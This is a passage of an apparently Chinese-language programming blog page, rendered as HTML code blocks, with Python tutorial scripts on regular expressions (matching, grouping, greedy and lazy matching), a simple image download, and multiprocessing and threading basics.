&#x27;娜扎佟丽娅热巴代斯&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result = re.match(&#x27;佟丽娅&#x27;, s) # 从头开始匹配，匹配不成功则返回None</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># search 进行正则字符串匹配方法，匹配的是整个字符串</span><br><span class=\"line\">result = re.search(&#x27;佟丽娅&#x27;, s)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\">print(result.span()) # 返回位置</span><br><span class=\"line\"></span><br><span class=\"line\">print(result.group()) # 使用group提取到匹配的内容</span><br><span class=\"line\">print(result.groups())</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;----------------------正则表达式的使用----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 提取符合两侧是字母，中间是数字的序列</span><br><span class=\"line\"># a2b h6k</span><br><span class=\"line\"># [] 表示的是一个范围</span><br><span class=\"line\"></span><br><span class=\"line\">s = &#x27;abcd7yjkfd8hdf00&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result = re.search(&#x27;[a-z][0-9][a-z]&#x27;, s)</span><br><span class=\"line\"># search 只要前面匹配到符合的项则停止检索后面的字符</span><br><span class=\"line\">print(result.group())</span><br><span class=\"line\"></span><br><span class=\"line\">result = re.findall(&#x27;[a-z][0-9][a-z]&#x27;, s)</span><br><span class=\"line\"># findall 匹配整个字符串，匹配到一个还会继续向后匹配，直到结尾</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 正则符号</span><br><span class=\"line\"># a7a  a88a  a7878a</span><br><span class=\"line\"></span><br><span class=\"line\">msg = &#x27;a7aopa88akjgka7878a&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result = re.findall(&#x27;[a-z][0-9]+[a-z]&#x27;, msg) # “+”表示该符合的字符的个数&gt;=1</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># QQ号验证  5-11位 开头不能是0</span><br><span class=\"line\">qq = &#x27;14944689962&#x27;</span><br><span class=\"line\">result = re.match(&#x27;[1-9][0-9]&#123;4,10&#125;$&#x27;, qq)</span><br><span class=\"line\">#                [start][remainder]&#123;remainder min len, remainder max len&#125;</span><br><span class=\"line\"># 添加$符号可以对字符串进行匹配到结尾字符</span><br><span class=\"line\"></span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># 用户名可以是字母或者数字，不能是数字开头，用户名长度必须6位以上[0-9a-zA-Z]</span><br><span class=\"line\"></span><br><span class=\"line\">username = &#x27;admin001&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result = re.search(&#x27;^[a-zA-Z]\\w&#123;5,&#125;$&#x27;, username)</span><br><span class=\"line\"># \\w: 匹配任意字母数字及下划线等价于[a-zA-Z0-9_]</span><br><span class=\"line\"># 使用search时添加^符号可以对字符串进行从头开始匹配，和$一起使用时就能从头到尾完全的匹配</span><br><span class=\"line\"></span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\">msg = &#x27;a*py ab.txt bb.py kk.png uu.py apyb.txt&#x27;</span><br><span class=\"line\">result = re.findall(r&#x27;\\w*\\.py\\b&#x27;, msg) # 使用&#x27;\\&#x27;时，建议结合&#x27;r&#x27;使用，避免出现转义</span><br><span class=\"line\"></span><br><span class=\"line\"># \\b: 匹配一个单词边界，也就是指单词和空格间的位置，</span><br><span class=\"line\"># 例如：&#x27;py\\b&#x27; 可以匹配&quot;python&quot;中的&#x27;py&#x27;，但不能匹配&quot;openpyx1&quot;中的&#x27;py&#x27;</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">总结：</span><br><span class=\"line\">    . 任意字符除&#123;\\n&#125;</span><br><span class=\"line\">    ^ 开头</span><br><span class=\"line\">    $ 结尾</span><br><span class=\"line\">    [] 范围 [abc] [a-z] [a-z*&amp;￥]</span><br><span class=\"line\">    </span><br><span class=\"line\">    正则预定义：</span><br><span class=\"line\">    \\s 空白（空格）</span><br><span class=\"line\">    \\b 边界</span><br><span class=\"line\">    \\d 数字</span><br><span class=\"line\">    \\w word [0-9a-zA-Z_]</span><br><span class=\"line\">    </span><br><span class=\"line\">    大写反面 \\S 非空格 \\D 非数字。。。</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#x27;\\w[0-9]&#x27;---&gt; \\w  [0-9] 只能匹配一个字母</span><br><span class=\"line\">    </span><br><span class=\"line\">    量词：</span><br><span class=\"line\">    * &gt;= 0</span><br><span class=\"line\">    + &gt;= 1</span><br><span class=\"line\">    ? 0,1</span><br><span class=\"line\">    </span><br><span class=\"line\">    手机号码正则</span><br><span class=\"line\">    re.match(&#x27;1[35789]\\d&#123;9&#125;$&#x27;, phone)</span><br><span class=\"line\">    &#123;m&#125;: 固定m位</span><br><span class=\"line\">    &#123;m,&#125;: &gt;= m</span><br><span class=\"line\">    &#123;m,n&#125;: m =&lt; phone &lt;= n</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"正则表达式的分组操作-py\"><a href=\"#正则表达式的分组操作-py\" class=\"headerlink\" title=\"正则表达式的分组操作.py\"></a>正则表达式的分组操作.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 分组</span><br><span class=\"line\"># 匹配数字0-100</span><br><span class=\"line\">import re</span><br><span class=\"line\"></span><br><span class=\"line\">n = &#x27;100&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result = re.match(r&#x27;[1-9]?\\d?$|100$&#x27;, n)</span><br><span class=\"line\"># | 表示或者，要么使用&quot;[1-9]?\\d$&quot;，要么使用&quot;100$&quot;</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># 验证输入的邮箱 163，126，qq</span><br><span class=\"line\">email = &#x27;7384677868@126.com&#x27;</span><br><span class=\"line\">result = re.match(r&#x27;\\w&#123;5,20&#125;@(163|126|qq)\\.(com|cn)$&#x27;, email)</span><br><span class=\"line\"># ( word | word | word) 区别 [abc] 表示的是一个字母而不是一个单词</span><br><span class=\"line\"># ()小括号表示分组</span><br><span class=\"line\"></span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 不是以4，7结尾的手机号码（11位）</span><br><span class=\"line\"></span><br><span class=\"line\">phone = &#x27;15901018869&#x27;</span><br><span class=\"line\">result = re.match(r&#x27;1\\d&#123;9&#125;[0-35-689]$&#x27;, phone)</span><br><span class=\"line\">print(result.group())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 爬虫</span><br><span class=\"line\">phone = &#x27;010-12345678&#x27;</span><br><span class=\"line\">result = re.match(r&#x27;(\\d&#123;3&#125;|\\d&#123;4&#125;)-(\\d&#123;8&#125;)$&#x27;, phone)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># 分别提取</span><br><span class=\"line\">print(result.group())</span><br><span class=\"line\"># ()表示分组  group(1) 表示提取到第一组的内容  group(2)表示第二组的内容</span><br><span class=\"line\">print(result.group(1))</span><br><span class=\"line\">print(result.group(2))</span><br><span class=\"line\"></span><br><span class=\"line\">#</span><br><span class=\"line\"></span><br><span class=\"line\">msg = &#x27;&lt;html&gt;abc&lt;/h1&gt;&lt;/html&gt;&#x27;</span><br><span class=\"line\">msg1 = &#x27;&lt;h1&gt;hello&lt;/h1&gt;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result = re.match(r&#x27;&lt;[0-9a-zA-Z]+&gt;(.+)&lt;/[0-9a-zA-Z]+&gt;&#x27;, msg)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\">print(result.group(1))</span><br><span class=\"line\"></span><br><span class=\"line\"># number</span><br><span class=\"line\">result = re.match(r&#x27;&lt;([0-9a-zA-Z]+)&gt;(.+)&lt;/\\1&gt;$&#x27;, msg1)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\">print(result.group(1))</span><br><span class=\"line\">print(result.group(2))</span><br><span class=\"line\"></span><br><span class=\"line\">#</span><br><span class=\"line\">msg = &#x27;&lt;html&gt;&lt;h1&gt;abc&lt;/h1&gt;&lt;/html&gt;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result = re.match(r&#x27;&lt;([0-9a-zA-Z]+)&gt;&lt;([0-9a-zA-Z]+)&gt;(.+)&lt;/\\2&gt;&lt;/\\1&gt;$&#x27;, msg)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\">print(result.group(1))</span><br><span class=\"line\">print(result.group(2))</span><br><span class=\"line\">print(result.group(3))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 起名的方式: (?P&lt;名字&gt;正则) (?P=名字)</span><br><span class=\"line\"></span><br><span class=\"line\">msg = &#x27;&lt;html&gt;&lt;h1&gt;abc&lt;/h1&gt;&lt;/html&gt;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result = re.match(r&#x27;&lt;(?P&lt;name1&gt;\\w+)&gt;&lt;(?P&lt;name2&gt;\\w+)&gt;(.+)&lt;/(?P=name2)&gt;&lt;/(?P=name1)&gt;&#x27;, msg)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\">print(result.group(1))</span><br><span class=\"line\">print(result.group(2))</span><br><span class=\"line\">print(result.group(3))</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">分组：() ---&gt; result.group(1) 获取组中匹配内容</span><br><span class=\"line\">引用分组的内容：number+起名</span><br><span class=\"line\"></span><br><span class=\"line\">re模块：</span><br><span class=\"line\">match  从开头匹配一次</span><br><span class=\"line\">search  只匹配一次</span><br><span class=\"line\">findall 查找所有</span><br><span class=\"line\">sub(正则表达式, &#x27;新内容&#x27;, string) 替换</span><br><span class=\"line\">split</span><br><span class=\"line\">result = re.split(r&#x27;[,:]&#x27;, &#x27;java:99, python:100&#x27;)</span><br><span class=\"line\">在字符串中搜索，如果遇到:或者，就分割，将分割的内容都保存在列表中</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">def func(temp):</span><br><span class=\"line\">    num = temp.group()</span><br><span class=\"line\">    num1 = int(num)+1</span><br><span class=\"line\">    return str(num1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># result = re.sub(r&#x27;\\d+&#x27;, &#x27;90&#x27;, &#x27;java:99, python:100&#x27;)</span><br><span class=\"line\"># print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">result = re.sub(r&#x27;\\d+&#x27;, func, &#x27;java:99, python:100&#x27;)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\">result = re.split(r&#x27;[,:]&#x27;, &#x27;java:99, python:100&#x27;)</span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"贪婪匹配和惰性匹配-py\"><a href=\"#贪婪匹配和惰性匹配-py\" class=\"headerlink\" title=\"贪婪匹配和惰性匹配.py\"></a>贪婪匹配和惰性匹配.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">python里数量词默认是贪婪的，总是尝试匹配尽可能多的字符。</span><br><span class=\"line\">非贪婪则相反，总是尝试匹配尽可能少的字符。</span><br><span class=\"line\">在“*”，“？”，“+”，“&#123;m,n&#125;后面加上？，使贪婪变成非贪婪</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">import re</span><br><span class=\"line\"></span><br><span class=\"line\"># 默认是贪婪的</span><br><span class=\"line\">msg = &#x27;abc123abc&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result = re.match(r&#x27;abc(\\d+?)&#x27;, msg)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\">path = &#x27;&lt;data-original=&quot;https://pic.luolanshijia.com/img/upload/vod/20200313-21/08736945e107956397067dc11086c344.jpg&quot; style=&quot;background-image: url(&amp;quot;https://pic.luolanshijia.com/img/upload/vod/20200313-21/08736945e107956397067dc11086c344.jpg&amp;quot;)&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result = re.match(r&#x27;&lt;data-original=&quot;(.*?)&quot;&#x27;, path)</span><br><span class=\"line\">print(result.group(1))</span><br><span class=\"line\">image_path = result.group(1)</span><br><span class=\"line\"></span><br><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.get(image_path)</span><br><span class=\"line\"></span><br><span class=\"line\">with open(&#x27;aa.jpg&#x27;, &#x27;wb&#x27;) as wstream:</span><br><span class=\"line\"></span><br><span class=\"line\">    wstream.write(response.content)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"进程-py\"><a href=\"#进程-py\" class=\"headerlink\" title=\"进程.py\"></a>进程.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 进程创建</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">process = Process(target=函数，name=进程的名字，args=(给函数传递的参数))</span><br><span class=\"line\">process 对象</span><br><span class=\"line\"></span><br><span class=\"line\">对象调用方法</span><br><span class=\"line\">process.start()</span><br><span class=\"line\">process.run() 只是执行了任务但是没有启动进程</span><br><span class=\"line\">terminate() 终止</span><br><span class=\"line\"></span><br><span class=\"line\">多进程对于全局变量的访问，在每一个全局变量里面都放一个m变量，</span><br><span class=\"line\">保证每个进程访问变量互不干扰</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">import os</span><br><span class=\"line\">from multiprocessing import Process</span><br><span class=\"line\">from time import sleep</span><br><span class=\"line\"></span><br><span class=\"line\">m = 1 # 不可变类型</span><br><span class=\"line\">list1 = [] # 可变类型</span><br><span class=\"line\"></span><br><span class=\"line\">def task1(s, name):</span><br><span class=\"line\">    global m</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        sleep(s)</span><br><span class=\"line\">        m += 1</span><br><span class=\"line\">        list1.append(str(m)+&#x27;task1&#x27;)</span><br><span class=\"line\">        print(&#x27;This is task1.......&#x27;, os.getpid(), &#x27;-----&#x27;, os.getppid(), name, m, list1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def task2(s, name):</span><br><span class=\"line\">    global m</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        sleep(s)</span><br><span class=\"line\">        m += 1</span><br><span class=\"line\">        list1.append(str(m)+&#x27;task2&#x27;)</span><br><span class=\"line\">        print(&#x27;This is task2.......&#x27;, os.getpid(), &#x27;-----&#x27;, os.getppid(), name, m, list1)</span><br><span class=\"line\"></span><br><span class=\"line\"># number = 1</span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    print(os.getpid())</span><br><span class=\"line\">    # 子进程</span><br><span class=\"line\">    p = Process(target=task1, name=&#x27;task1&#x27;, args=(1, &#x27;aa&#x27;))</span><br><span class=\"line\">    p.start()</span><br><span class=\"line\">    # print(p.name)</span><br><span class=\"line\">    p1 = Process(target=task2, name=&#x27;task2&#x27;, args=(2, &#x27;bb&#x27;))</span><br><span class=\"line\">    p1.start()</span><br><span class=\"line\">    # print(p1.name)</span><br><span class=\"line\"></span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        sleep(1)</span><br><span class=\"line\">        m += 1</span><br><span class=\"line\">        print(&#x27;-----------&gt;main:&#x27;, m)</span><br><span class=\"line\"></span><br><span class=\"line\">    # while True:</span><br><span class=\"line\">    #     number += 1</span><br><span class=\"line\">    #     sleep(0.2)</span><br><span class=\"line\">    #     if number == 100:</span><br><span class=\"line\">    #         p.terminate()</span><br><span class=\"line\">    #         p1.terminate()</span><br><span class=\"line\">    #         break</span><br><span class=\"line\">    #     else:</span><br><span class=\"line\">    #         print(&#x27;-----------------&gt;number:&#x27;, number)</span><br><span class=\"line\"></span><br><span class=\"line\">    print(&#x27;----------------------------------&#x27;)</span><br><span class=\"line\">    print(&#x27;***********************************&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"自定义进程-py\"><a href=\"#自定义进程-py\" class=\"headerlink\" title=\"自定义进程.py\"></a>自定义进程.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">import os</span><br><span class=\"line\">from multiprocessing import Process</span><br><span class=\"line\">from time import sleep</span><br><span class=\"line\"></span><br><span class=\"line\">class MyProcess(Process):</span><br><span class=\"line\"></span><br><span class=\"line\">    def __init__(self, name):</span><br><span class=\"line\">        super(MyProcess, self).__init__()</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # 重写run方法</span><br><span class=\"line\">    def run(self):</span><br><span class=\"line\">        n = 1</span><br><span class=\"line\">        while True:</span><br><span class=\"line\">            print(&#x27;&#123;&#125;-------------&gt;self defined process, n:&#123;&#125;\\n&#x27;.format(n, self.name))</span><br><span class=\"line\">            n += 1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    p = MyProcess(&#x27;xiaoming&#x27;)</span><br><span class=\"line\">    p.start()</span><br><span class=\"line\"></span><br><span class=\"line\">    p1 = MyProcess(&#x27;xiaohong&#x27;)</span><br><span class=\"line\">    p1.start()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"进程池之非阻塞式-py\"><a href=\"#进程池之非阻塞式-py\" class=\"headerlink\" title=\"进程池之非阻塞式.py\"></a>进程池之非阻塞式.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">阻塞式：</span><br><span class=\"line\"></span><br><span class=\"line\">非阻塞式：全部添加到队列中，立刻返回，并没有等待其他的进程完毕，但是回调函数是等待任务完成之后才调用</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">from multiprocessing import Pool</span><br><span class=\"line\">import time</span><br><span class=\"line\">from random import random</span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 非阻塞式进程</span><br><span class=\"line\"></span><br><span class=\"line\">def task(task_name):</span><br><span class=\"line\">    print(&#x27;task begin&#x27;, task_name)</span><br><span class=\"line\">    start = time.time()</span><br><span class=\"line\">    # 使用sleep</span><br><span class=\"line\">    time.sleep(random()*2)</span><br><span class=\"line\">    end = time.time()</span><br><span class=\"line\">    # print(&#x27;elapsed time is &#123;&#125; when task &#123;&#125; complete, &#x27;</span><br><span class=\"line\">    #       &#x27;process ID is &#123;&#125;&#x27;.format((end-start), task_name, os.getpid()))</span><br><span class=\"line\">    return &#x27;elapsed time is &#123;&#125; when task &#123;&#125; complete, &#x27; \\</span><br><span class=\"line\">           &#x27;process ID is &#123;&#125;&#x27;.format((end-start), task_name, os.getpid())</span><br><span class=\"line\"></span><br><span class=\"line\">container = []</span><br><span class=\"line\">def callback_func(n):</span><br><span class=\"line\">    container.append(n)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    pool = Pool(5)</span><br><span class=\"line\"></span><br><span class=\"line\">    tasks = [&#x27;listen to music&#x27;, &#x27;Enjoin meal&#x27;, &#x27;wash clothes&#x27;,</span><br><span class=\"line\">             &#x27;Play games&#x27;, &#x27;walk&#x27;, &#x27;take care child&#x27;, &#x27;cook&#x27;]</span><br><span class=\"line\">    for task1 in tasks:</span><br><span class=\"line\">        pool.apply_async(task, args=(task1,), callback=callback_func)</span><br><span class=\"line\"></span><br><span class=\"line\">    pool.close() # 添加任务结束</span><br><span class=\"line\">    pool.join() #</span><br><span class=\"line\"></span><br><span class=\"line\">    for c in container:</span><br><span class=\"line\">        print(c)</span><br><span class=\"line\">    print(&#x27;over!!!&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"进程池之阻塞式-py\"><a href=\"#进程池之阻塞式-py\" class=\"headerlink\" title=\"进程池之阻塞式.py\"></a>进程池之阻塞式.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">特点：</span><br><span class=\"line\">添加一个任务执行一个，如果一个任务不结束，另一个任务则无法进行</span><br><span class=\"line\"></span><br><span class=\"line\">进程池：</span><br><span class=\"line\">pool = Pool(max) 创建进程池对象</span><br><span class=\"line\">pool.apply() 阻塞式</span><br><span class=\"line\">pool.apply_async() 非阻塞式</span><br><span class=\"line\"></span><br><span class=\"line\">pool.close()</span><br><span class=\"line\">pool.join() 让主进程让步</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">import os</span><br><span class=\"line\">import time</span><br><span class=\"line\">from multiprocessing import Pool</span><br><span class=\"line\">from random import random</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def task(task_name):</span><br><span class=\"line\">    print(&#x27;task begin&#x27;, task_name)</span><br><span class=\"line\">    start = time.time()</span><br><span class=\"line\">    # 使用sleep</span><br><span class=\"line\">    time.sleep(random()*2)</span><br><span class=\"line\">    end = time.time()</span><br><span class=\"line\">    print(&#x27;elapsed time is &#123;&#125; when task &#123;&#125; complete, &#x27;</span><br><span class=\"line\">          &#x27;process ID is &#123;&#125;&#x27;.format((end-start), task_name, os.getpid()))</span><br><span class=\"line\">    # return &#x27;elapsed time is &#123;&#125; when task &#123;&#125; complete, &#x27; \\</span><br><span class=\"line\">    #        &#x27;process ID is &#123;&#125;&#x27;.format((end-start), task_name, os.getpid())</span><br><span class=\"line\"></span><br><span class=\"line\"># container = []</span><br><span class=\"line\"># def callback_func(n):</span><br><span class=\"line\">#     container.append(n)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    pool = Pool(5)</span><br><span class=\"line\">    tasks = [&#x27;listen to music&#x27;, &#x27;Enjoin meal&#x27;, &#x27;wash clothes&#x27;,</span><br><span class=\"line\">             &#x27;Play games&#x27;, &#x27;walk&#x27;, &#x27;take care child&#x27;, &#x27;cook&#x27;]</span><br><span class=\"line\">    for task1 in tasks:</span><br><span class=\"line\">        pool.apply(task, args=(task1,))</span><br><span class=\"line\"></span><br><span class=\"line\">    pool.close()</span><br><span class=\"line\">    pool.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    print(&#x27;over!!!&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"进程间通信-py\"><a href=\"#进程间通信-py\" class=\"headerlink\" title=\"进程间通信.py\"></a>进程间通信.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 队列</span><br><span class=\"line\">from multiprocessing import Process</span><br><span class=\"line\">from multiprocessing import Queue</span><br><span class=\"line\"></span><br><span class=\"line\"># q = Queue(5)</span><br><span class=\"line\">#</span><br><span class=\"line\"># q.put(&#x27;A&#x27;)</span><br><span class=\"line\"># q.put(&#x27;B&#x27;)</span><br><span class=\"line\"># q.put(&#x27;C&#x27;)</span><br><span class=\"line\"># q.put(&#x27;D&#x27;)</span><br><span class=\"line\"># q.put(&#x27;E&#x27;)</span><br><span class=\"line\"># print(q.qsize())</span><br><span class=\"line\"># if not q.full(): # 判断队列是否满了  q.empty()--判断队列是否是空的</span><br><span class=\"line\">#     q.put(&#x27;F&#x27;, timeout=3) # put() 如果队列满了，则只能等待，除非有空队列才可添加</span><br><span class=\"line\"># else:</span><br><span class=\"line\">#     print(&#x27;queue full&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\"># # 获取队列的值</span><br><span class=\"line\"># print(q.get(timeout=2))</span><br><span class=\"line\"># print(q.get(timeout=2))</span><br><span class=\"line\"># print(q.get(timeout=2))</span><br><span class=\"line\"># print(q.get(timeout=2))</span><br><span class=\"line\"># print(q.get(timeout=2))</span><br><span class=\"line\"># # print(q.get(timeout=2)) # _queue.Empty</span><br><span class=\"line\">#</span><br><span class=\"line\"># q.put_nowait(&#x27;G&#x27;)</span><br><span class=\"line\"># print(q.get_nowait())</span><br><span class=\"line\">from time import sleep</span><br><span class=\"line\"></span><br><span class=\"line\"># print(&#x27;----------------------------------进程间通信--------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">def download(q):</span><br><span class=\"line\">    images = [&#x27;girl.jpg&#x27;, &#x27;boy.jpg&#x27;, &#x27;man.jpg&#x27;]</span><br><span class=\"line\">    for image in images:</span><br><span class=\"line\">        print(&#x27;downloading: &#x27;, image)</span><br><span class=\"line\">        sleep(0.5)</span><br><span class=\"line\">        q.put(image)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def getfile(q):</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            file = q.get(timeout=5)</span><br><span class=\"line\">            print(&#x27;&#123;&#125; save sucess!&#x27;.format(file))</span><br><span class=\"line\"></span><br><span class=\"line\">        except:</span><br><span class=\"line\">            print(&#x27;All file saved complete&#x27;)</span><br><span class=\"line\">            break</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    q = Queue(5)</span><br><span class=\"line\"></span><br><span class=\"line\">    p1 = Process(target=download, args=(q,))</span><br><span class=\"line\">    p2 = Process(target=getfile, args=(q,))</span><br><span class=\"line\"></span><br><span class=\"line\">    p1.start()</span><br><span class=\"line\">    p1.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    p2.start()</span><br><span class=\"line\">    p2.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    print(&#x27;0000000000&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"多线程-py\"><a href=\"#多线程-py\" class=\"headerlink\" title=\"多线程.py\"></a>多线程.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 线程</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">创建线程：</span><br><span class=\"line\">t = threading.Thread(target=download, name=&#x27;aa&#x27;, args=(1,))</span><br><span class=\"line\">使用线程：</span><br><span class=\"line\">t.start()</span><br><span class=\"line\"></span><br><span class=\"line\">线程状态：</span><br><span class=\"line\">新建  就绪  运行  阻塞  结束</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">线程可以共享全局变量</span><br><span class=\"line\">GIL  全局解释器锁 --&gt; 计算量小的时候默认加锁：线程同步，速度慢，数据安全</span><br><span class=\"line\">                    计算量大的时候释放解释器锁</span><br><span class=\"line\"></span><br><span class=\"line\">线程：耗时操作，爬虫，IO</span><br><span class=\"line\">进程：计算密集型</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">import threading</span><br><span class=\"line\">from time import sleep</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># def download(n):</span><br><span class=\"line\">#     images = [&#x27;girl.jpg&#x27;, &#x27;boy.jpg&#x27;, &#x27;man.jpg&#x27;]</span><br><span class=\"line\">#     for image in images:</span><br><span class=\"line\">#         print(&#x27;downloading: &#x27;, image)</span><br><span class=\"line\">#         sleep(n)</span><br><span class=\"line\">#         print(&#x27;&#123;&#125; download complete!&#x27;.format(image))</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\"># def listenMusic():</span><br><span class=\"line\">#     musics = [&#x27;Wide noodles in big bowl&#x27;, &#x27;Turkey ice cream&#x27;,</span><br><span class=\"line\">#               &#x27;Roast gluten&#x27;, &#x27;Roast steamed bun slices&#x27;]</span><br><span class=\"line\">#     for music in musics:</span><br><span class=\"line\">#         sleep(0.5)</span><br><span class=\"line\">#         print(&#x27;listening &#123;&#125;&#x27;.format(music))</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\"># if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">#</span><br><span class=\"line\">#     # 线程对象</span><br><span class=\"line\">#     t = threading.Thread(target=download, name=&#x27;aa&#x27;, args=(1,))</span><br><span class=\"line\">#     t.start()</span><br><span class=\"line\">#</span><br><span class=\"line\">#     t1 = threading.Thread(target=listenMusic, name=&#x27;aa&#x27;)</span><br><span class=\"line\">#     t1.start()</span><br><span class=\"line\">#</span><br><span class=\"line\">#     n = 1</span><br><span class=\"line\">#     while True:</span><br><span class=\"line\">#         print(n)</span><br><span class=\"line\">#         sleep(1.5)</span><br><span class=\"line\">#         n += 1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;----------------------------------------------------------&#x27;)</span><br><span 